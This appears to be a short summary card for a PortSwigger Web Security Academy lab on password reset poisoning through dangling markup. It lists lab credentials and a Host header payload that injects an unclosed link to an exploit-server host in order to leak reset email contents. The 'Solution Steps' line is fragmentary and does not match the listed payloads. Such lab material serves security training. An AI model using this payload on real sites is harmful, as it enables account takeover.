## Password reset poisoning via dangling markup

**Category:** host_header
**Difficulty:** Unknown

### Description
This lab is vulnerable to password reset poisoning via dangling markup. To solve the lab, log in to Carlos's account.

### Solution Steps
Some antivirus software scans links in emails to identify whether they are malicious.

### Key Payloads
- `wiener:peter`
- `GET /email`
- `DOMPurify`
- `POST /forgot-password`
- `Host: YOUR-LAB-ID.web-security-academy.net:arbitraryport`
- `Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?`
- `GET /?/login'>[…]`
- `username`
- `carlos`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: host_header

---
*Source: PortSwigger Web Security Academy*
